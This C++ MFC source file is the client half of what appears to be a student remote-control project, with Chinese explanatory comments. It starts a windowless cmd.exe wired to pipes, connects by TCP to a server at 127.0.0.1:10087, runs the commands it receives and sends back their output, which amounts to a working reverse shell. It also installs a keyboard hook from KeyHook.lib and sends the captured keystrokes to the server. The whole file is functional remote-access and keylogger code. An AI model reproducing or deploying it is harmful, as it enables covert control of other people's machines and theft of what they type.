
// TCPClientUIDlg.cpp: 实现文件
//








#include "pch.h"
//#include "framework.h"
#include "TCPClientUI.h"
#include "TCPClientUIDlg.h"
#include "afxdialogex.h"

#include "common.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


//客户端准备好cmd功能

//定义管道句柄
	//Windows 管道
	//A程序将数据通过管道发送给B程序 pipe
	//CreatePipe()
HANDLE hCmdReadPipe;       //cmd读端口
HANDLE hMyWritePipe;      //my写端口

HANDLE hMyReadPipe;       //my读数据
HANDLE hCmdWritePipe;      //cmd写数据

  //   hMyWritePipe ---> hCmdReadPipe
  //my                                  cmd         
  //   hMyReadPipe <--- hCmdWritePipe

//定义创建管道返回值存放位置
BOOL bRet;
//定义 初始化cmd 和 初始化socket 函数返回值存放位置
BOOL nRet;
//定义全局变量socket
SOCKET s;
//定义connect返回值存放位置
int nRetc = 0;
//定义连接IP


//创建进程时，这俩参数需要初始化
PROCESS_INFORMATION pi = { 0 };
STARTUPINFO si = { 0 };

#pragma comment(lib,"../bin/KeyHook.lib")

BOOL MySetHook(HWND hWnd);




// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CTCPClientUIDlg 对话框



CTCPClientUIDlg::CTCPClientUIDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_TCPCLIENTUI_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CTCPClientUIDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//  DDX_Control(pDX, IDC_EDIT1, edit1);
	DDX_Control(pDX, IDC_EDIT1, edit1);
	//  DDX_Control(pDX, IDC_EDIT1, edit2);
	DDX_Control(pDX, IDC_EDIT1, edit1);
}

BEGIN_MESSAGE_MAP(CTCPClientUIDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//ON_BN_CLICKED(IDOK, &CTCPClientUIDlg::OnBnClickedOk)
	//ON_BN_CLICKED(IDCANCEL, &CTCPClientUIDlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDC_BUTTON1, &CTCPClientUIDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CTCPClientUIDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &CTCPClientUIDlg::OnBnClickedButton3)
	ON_WM_COPYDATA()
END_MESSAGE_MAP()


// CTCPClientUIDlg 消息处理程序

BOOL CTCPClientUIDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码


	InitCmdAndSocket();
	




















	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CTCPClientUIDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CTCPClientUIDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CTCPClientUIDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}










int InitCmd()
{
	// TODO: 在此处添加实现代码.
	//创建两个匿名管道
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;

	bRet = CreatePipe(&hCmdReadPipe, &hMyWritePipe, &sa, 0);
	if (!bRet) {
		//edit1.SetWindowTextW(TEXT("create pipe error"));
		//printf("create pipe error");
		return 0;
	}

	bRet = CreatePipe(&hMyReadPipe, &hCmdWritePipe, &sa, 0);
	if (!bRet) {
		//edit1.SetWindowTextW(TEXT("create pipe error"));
		//printf("create pipe error");
		return 0;
	}

	//坑
	//替换cmd的标准输入输出
	si.cb = sizeof(STARTUPINFO);

	si.dwFlags = STARTF_USESTDHANDLES;      //dwFlags 标志位，开启句柄替换的标志

	si.hStdInput = hCmdReadPipe;
	si.hStdOutput = hCmdWritePipe;
	si.hStdError = hCmdWritePipe;

	//创建cmd进程，失败退出
	bRet = CreateProcess(
		_T("C:\\Windows\\system32\\cmd.exe"),   //被启动的程序路径
		NULL,  //命令行参数
		NULL,   //进程句柄继承属性
		NULL,   //线程句柄继承属性
		TRUE,   //继承开关
		CREATE_NO_WINDOW,   //以无窗口状态创建
		NULL,   //环境变量
		NULL,   //当前路径 程序双击启动时的路径（相对路径）
		&si,   //传出参数 取地址，传入指针
		&pi   //传出参数

	);
	//创建失败则退出程序
	if (!bRet) {
		//edit2.SetWindowTextW(TEXT("create process error"));
		
		//printf("create process error");
		return 0;
	}
	else
	{
		//edit1.SetWindowTextW(TEXT("创建cmd进程成功\n"));
		//printf("创建cmd进程成功\n");
	}

	return 1;
}




int InitSocket()
{
	// TODO: 在此处添加实现代码.
	//windows很特殊，需要单独调用api来进行网络的初始化和反初始化
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	/* Use the MAKEWORD(lowbyte, highbyte) macro declared in Windef.h */
	wVersionRequested = MAKEWORD(2, 2);
	//初始化操作
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		/* Tell the user that we could not find a usable */
		/* Winsock DLL.                                  */
		//edit1.SetWindowTextW(TEXT("WSAStartup failed with error: %d\n"));
		//printf("WSAStartup failed with error: %d\n", err);
		return 0;
	}

	//1. socket 创建一个套接字（可以理解成管道的pipe句柄，用于后续的数据传输接口）
	s = socket(
		AF_INET,    //INET协议簇
		SOCK_STREAM,    //表示使用的是TCP协议
		0
	);
	if (s == INVALID_SOCKET) {
		//edit1.SetWindowTextW(TEXT("创建套接字失败！"));
		//printf("创建套接字失败！");
		return 0;
	}


	//2. bind/listen 绑定/监听端口

	//IP地址：类似于网络中的家庭地址（很多网络应用）
	//端口用于区分是哪个应用的数据，只是一个编号0-65535。3389端口 远程连接 RDP     80端口 网页 http
	//一个应用软件可以有多少个端口？
	//看这里有多少个TCP连接
	//源ip:源端口  ------  目标ip:目标端口
	//挑选一个本机其他软件没有使用的端口来使用
	//sockaddr s;     //用于描述IP和端口的结构体,这个不好用，因为内部是一个数组

	sockaddr_in addr;      //用于替代sockaddr结构体，两者大小一致
	int nLength = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;  //写死
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");   //连接到目标主机的IP
	addr.sin_port = htons(10087);      //h:host to n:network  short   坑，网络字节序（大尾方式）和本地字节序（小尾方式）

	return 1;
}


int ConnectServer() {
	//2. connect 主动连接服务器
	sockaddr_in addr = { 0 };      //用于替代sockaddr结构体，两者大小一致
	int nLength = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;  //写死
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(10087);

	nRetc = connect(
		s,
		(sockaddr*)&addr,
		nLength
	);
	if (SOCKET_ERROR == nRetc) {
		printf("\n未能成功连接到服务器");
		return 0;
	}
	else
	{
		printf("\n成功连接到服务器\n");
		return 1;
	}
	//到这里表示建立了连接
}

void CTCPClientUIDlg::InitCmdAndSocket()
{
	// TODO: 在此处添加实现代码.
		//调用初始化cmd,初始化失败返回0
	nRet = InitCmd();
	if (nRet == 0) {
		//edit1.SetWindowTextW(TEXT("init cmd error"));
		//printf("init cmd error");
		return;
	}
	else
	{
		//edit1.SetWindowTextW(TEXT("cmd初始化完成"));
		//printf("cmd初始化完成");
	}


	//调用初始化socket,初始化失败返回0
	nRet = InitSocket();
	if (nRet == 0) {
		//edit1.SetWindowTextW(TEXT("init socket error"));
		//printf("init socket error");
		return;
	}
	else
	{
		//edit1.SetWindowTextW(TEXT("\nsocket初始化完成"));
		//printf("\nsocket初始化完成");
	}

	
}







void CTCPClientUIDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	//ConnectServer();

	//到这里表示建立了连接
	//Recv收到服务端的命令输入，这里发送到写管道WriteFile中，
	//然后在读取管道ReadFile的输出，在发回Send给服务器

	//建议开辟一个线程来处理读取管道内容并发送回服务端
	//创建了一个线程对象 lamda写法 括号里是线程回调函数 &符号表示外面定义的所有变量，这个回调函数都可以使用。
	std::thread thd([&]() {
		//表示程序拥有新的起点
		while (TRUE)
		{
			DWORD readSize = 0;
			char readBuf[1000] = { 0 };
			char szBuf[1024] = {0};
			//Sleep(1000);
			//查看管道是否有数据可读
			PeekNamedPipe(hMyReadPipe, readBuf, sizeof(readBuf) - 1, &readSize, NULL, NULL);	//查看管道是否有数据，不会清除管道数据
			if (readSize == 0) {
				//printf("cmd输出端数据本次已读完");
				//break;      //没有可读数据，退出
				Sleep(1000);
			}
			else
			{
				ReadFile(hMyReadPipe, readBuf, sizeof(readBuf) - 1, &readSize, NULL);
				//读取完成之后，通过socket发送给服务端

				const char* pStr = (const char*)readBuf;
				
				MyPacket* pPkt = (MyPacket*)szBuf;

				pPkt->type = PACKET_REQ_CMD;
				pPkt->length = strlen(pStr) + 1;	//仅仅表示数据长度，不包括结构体头部的前面2个4字节。
				memcpy(pPkt->data, pStr, pPkt->length);	//将数据拷贝给包中

				send(
					s,
					(const char*)pPkt,
					pPkt->length + sizeof(unsigned int) * 2,
					0
				);



				/*
				int nSendedBytes = send(s, readBuf, readSize, 0);
				if (nSendedBytes == 0) {
					edit1.SetWindowTextW(TEXT("send error"));
					return 0;
				}
				*/
			}
			//printf(readBuf);	//打印遇到\0结束打印，所以每次打印需要预留一个'\0'结尾的字节



		}

		});
	thd.detach();      //避免主线程结束时，子线程对象被销毁。

	std::thread thdd([&]() {
	//Recv收到服务端的命令输入，发送到写管道WriteFile中，

	int nRet;
	char szBuf[256] = { 0 };
	char szBuffer[256] = { 0 };
	CString KeyBoardBuffer;
	CString CmdBuffer;
	DWORD nWritedLength = 0;

	while (true)
	{

		Sleep(500);
		MyPacket* pPkt = (MyPacket*)szBuf;
		//循环收包，确保收到一个完整的包

		nRet = recv(s, szBuf, sizeof(unsigned int) * 2, 0);
		if (nRet == 8) {
			if (pPkt->type == PACKET_RLY_KEYBOARD) {
				nRet = recv(s, szBuffer, pPkt->length, 0);
				if (nRet > 0) {
					KeyBoardBuffer += szBuffer;
					//edit2.SetWindowTextW(KeyBoardBuffer);
				}
			}
			if (pPkt->type == PACKET_RLY_CMD) {
				nRet = recv(s, szBuffer, pPkt->length, 0);
				if (nRet > 0) {
					CmdBuffer += szBuffer;
					//CmdBuffer += '\n';
					edit1.SetWindowTextW(CmdBuffer);

					//将收到的CMD命令写入管道
					
					BOOL bRett = WriteFile(hMyWritePipe,
						szBuffer,
						nRet-1,
						&nWritedLength,
						//(LPDWORD)&nWritedLength,     //C语言
						//reinterpret_cast<LPDWORD>(&nWritedLength),    //C++
						NULL    //与异步有关
					);
					if (!bRett) {
						edit1.SetWindowTextW(TEXT("write pipe error"));
					}
				}
			}

		}
		else {
			//edit1.SetWindowTextW(TEXT("Wait for CMD command"));
			edit1.SetWindowTextW(TEXT("Recv CMD Command Error"));
		}





















		/*
		char szBuf[256] = { 0 };
		int nRet = recv(s, szBuf, 256, 0); //返回值
		if (nRet == 0) {
			//表示TCP断开了

			return;
		}
		else if (nRet > 0) {
			//返回值 >0 表示成功的字节数
			//printf("\n服务端：%s\t大小：%d字节", szBuf, nRet);
			//printf("接收到来自服务端的命令：%s", szBuf);
			

			DWORD nWritedLength = 0;
			BOOL bRett = WriteFile(hMyWritePipe,
				szBuf,
				nRet,
				&nWritedLength,
				//(LPDWORD)&nWritedLength,     //C语言
				//reinterpret_cast<LPDWORD>(&nWritedLength),    //C++
				NULL    //与异步有关
			);
			if (!bRett) {
				edit1.SetWindowTextW(TEXT("write file error"));
				//printf("write file error");
			}
			//else {
			//    printf("写入cmd管道输入端成功\n");
			//}
		}
		*/
	}

	});
	thdd.detach();
}


void CTCPClientUIDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	ConnectServer();
}


void CTCPClientUIDlg::OnBnClickedButton3()
{
	// TODO: 在此添加控件通知处理程序代码

		//调用API下键盘钩子

	BOOL bRet = MySetHook(this->m_hWnd);

	if (!bRet) {
		//OutputDebugStringA("下钩子失败");
		edit1.SetWindowTextW(TEXT("下钩子失败"));

		return;
	}
	else {
		edit1.SetWindowTextW(TEXT("HOOK成功"));
	}
}


BOOL CTCPClientUIDlg::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	//char strBuffer[10] = { 0 };
	//memcpy(
	//	&strBuffer,
	//	pCopyDataStruct->lpData,		//要拷贝的数据数据
	//	pCopyDataStruct->cbData			//拷贝大小
	//);
	//send(s, strBuffer, pCopyDataStruct->cbData, 0);

	//表示我们的DLL发送的数据，我们到这里接受并处理
	PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)pCopyDataStruct;
	//向服务端发送数据
	const char* pStr = (const char*)pcds -> lpData;
	char szBuf[256];
	MyPacket* pPkt = (MyPacket *)szBuf;

	pPkt->type = PACKET_REQ_KEYBOARD;
	pPkt->length = strlen(pStr) + 1;	//仅仅表示数据长度，不包括结构体头部的前面2个4字节。
	memcpy(pPkt->data, pStr, pPkt->length);	//将数据拷贝给包中

	send(
		s,	
		(const char*)pPkt,
		pPkt->length + sizeof(unsigned int)*2,
		0
		);







	return CDialogEx::OnCopyData(pWnd, pCopyDataStruct);
}
